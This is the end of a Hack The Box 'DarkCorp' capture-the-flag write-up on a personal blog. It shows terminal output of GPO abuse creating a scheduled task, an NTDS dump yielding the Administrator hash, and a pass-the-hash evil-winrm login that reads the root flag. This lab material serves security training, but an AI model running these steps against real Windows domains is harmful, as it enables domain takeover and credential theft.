logonType=&quot;</span>InteractiveToken<span class="string">&quot;&gt;&lt;Task version=&quot;</span>1.3<span class="string">&quot;&gt;&lt;RegistrationInfo&gt;&lt;Author&gt;&#123;self._author&#125;&lt;/Author&gt;&lt;Description&gt;&#123;self._description&#125;&lt;/Description&gt;&lt;/RegistrationInfo&gt;&lt;Principals&gt;&lt;Principal id=&quot;</span>Author<span class="string">&quot;&gt;&lt;UserId&gt;%LogonDomain%\%LogonUser%&lt;/UserId&gt;&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;&lt;/Principal&gt;&lt;/Principals&gt;&lt;Settings&gt;&lt;IdleSettings&gt;&lt;Duration&gt;PT10M&lt;/Duration&gt;&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;&lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;&lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;&lt;/IdleSettings&gt;&lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;&lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;&lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;&lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;&lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;&lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;&lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;Hidden&gt;false&lt;/Hidden&gt;&lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;&lt;WakeToRun&gt;false&lt;/WakeToRun&gt;&lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;&lt;Priority&gt;7&lt;/Priority&gt;&lt;DeleteExpiredTaskAfter&gt;PT0S&lt;/DeleteExpiredTaskAfter&gt;&lt;/Settings&gt;&lt;Triggers&gt;&lt;TimeTrigger&gt;&lt;StartBoundary&gt;%LocalTimeXmlEx%&lt;/StartBoundary&gt;&lt;EndBoundary&gt;%LocalTimeXmlEx%&lt;/EndBoundary&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/TimeTrigger&gt;&lt;/Triggers&gt;&lt;Actions Context=&quot;</span>Author<span class="string">&quot;&gt;&lt;Exec&gt;&lt;Command&gt;&#123;self._shell&#125;&lt;/Command&gt;&lt;Arguments&gt;&#123;self._command&#125;&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;&lt;/Properties&gt;&lt;/ImmediateTaskV2&gt;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">/home/kali/Hackthebox/DarkCorp/pyGPOAbuse/pygpoabuse/scheduledtask.py:54: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\%&#x27;</span></span><br><span class="line">  self._task_str = f<span class="string">&quot;&quot;</span><span class="string">&quot;&lt;ImmediateTaskV2 clsid=&quot;</span>&#123;&#123;9756B581-76EC-4169-9AFC-0CA8D43ADB5F&#125;&#125;<span class="string">&quot; name=&quot;</span>&#123;self._name&#125;<span class="string">&quot; image=&quot;</span>0<span class="string">&quot; changed=&quot;</span>&#123;self._mod_date&#125;<span class="string">&quot; uid=&quot;</span>&#123;&#123;&#123;self._guid&#125;&#125;&#125;<span class="string">&quot;&gt;&lt;Properties action=&quot;</span>C<span class="string">&quot; name=&quot;</span>&#123;self._name&#125;<span class="string">&quot; runAs=&quot;</span>%LogonDomain%\%LogonUser%<span class="string">&quot; logonType=&quot;</span>InteractiveToken<span class="string">&quot;&gt;&lt;Task version=&quot;</span>1.3<span class="string">&quot;&gt;&lt;RegistrationInfo&gt;&lt;Author&gt;&#123;self._author&#125;&lt;/Author&gt;&lt;Description&gt;&#123;self._description&#125;&lt;/Description&gt;&lt;/RegistrationInfo&gt;&lt;Principals&gt;&lt;Principal id=&quot;</span>Author<span class="string">&quot;&gt;&lt;UserId&gt;%LogonDomain%\%LogonUser%&lt;/UserId&gt;&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;&lt;/Principal&gt;&lt;/Principals&gt;&lt;Settings&gt;&lt;IdleSettings&gt;&lt;Duration&gt;PT10M&lt;/Duration&gt;&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;&lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;&lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;&lt;/IdleSettings&gt;&lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;&lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;&lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;&lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;&lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;&lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;&lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;Hidden&gt;false&lt;/Hidden&gt;&lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;&lt;WakeToRun&gt;false&lt;/WakeToRun&gt;&lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;&lt;Priority&gt;7&lt;/Priority&gt;&lt;DeleteExpiredTaskAfter&gt;PT0S&lt;/DeleteExpiredTaskAfter&gt;&lt;/Settings&gt;&lt;Triggers&gt;&lt;TimeTrigger&gt;&lt;StartBoundary&gt;%LocalTimeXmlEx%&lt;/StartBoundary&gt;&lt;EndBoundary&gt;%LocalTimeXmlEx%&lt;/EndBoundary&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/TimeTrigger&gt;&lt;/Triggers&gt;&lt;Actions Context=&quot;</span>Author<span class="string">&quot;&gt;&lt;Exec&gt;&lt;Command&gt;&#123;self._shell&#125;&lt;/Command&gt;&lt;Arguments&gt;&#123;self._command&#125;&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;&lt;/Properties&gt;&lt;/ImmediateTaskV2&gt;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">INFO:root:Version updated</span><br><span class="line">[*] Version updated</span><br><span class="line">SUCCESS:root:ScheduledTask LocalAdmin created!</span><br><span class="line">[+] ScheduledTask LocalAdmin created!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/pyGPOAbuse]</span><br><span class="line">â””â”€$ evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p <span class="string">&#x27;!QAZzaq1&#x27;</span>                        </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents&gt; gpupdate /force</span><br><span class="line">Updating policy...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Computer Policy update has completed successfully.</span><br><span class="line"></span><br><span class="line">User Policy update has completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>&#x3D;&#x3D;&#x3D;&gt;</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/pyGPOAbuse]</span><br><span class="line">â””â”€$ nxc smb dc-01 -u taylor.b.adm -p <span class="string">&#x27;!QAZzaq1&#x27;</span> --ntds --user Administrator</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [+] Dumping the NTDS, this could take a <span class="keyword">while</span> so go grab a redbull...</span><br><span class="line">SMB         172.16.20.1     445    DC-01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/DC-01_172.16.20.1_2025-02-15_133234.ntds of <span class="built_in">which</span> 1 were added to the database</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [*] To extract only enabled accounts from the output file, run the following <span class="built_in">command</span>:</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [*] <span class="built_in">cat</span> /home/kali/.nxc/logs/DC-01_172.16.20.1_2025-02-15_133234.ntds | grep -iv disabled | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f1</span><br><span class="line">SMB         172.16.20.1     445    DC-01            [*] grep -iv disabled /home/kali/.nxc/logs/DC-01_172.16.20.1_2025-02-15_133234.ntds | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f1</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/pyGPOAbuse]</span><br><span class="line">â””â”€$ evil-winrm -i dc-01.darkcorp.htb -u Administrator -H <span class="string">&#x27;fcb3ca5a19a1ccf2d14c13e8b64cde0f&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">48ccc2ca67579f0154b4d8abec998a14</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>This was what I wrote on my notes when I finished the machine lol:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/DarkCorp/finally.png"
                      alt="Finally"
                ><figcaption>Finally</figcaption></figure></p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: DarkCorp</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-10-18 20:20:18</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-18 21:02:47
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/10/18/Hackthebox-DarkCorp/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/10/24/Hackthebox-Artificial/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Artificial</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/10/11/Hackthebox-TombWatcher/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: TombWatcher</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: DarkCorp</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Relay-Attack"><span class="nav-text">NTLM Relay Attack</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
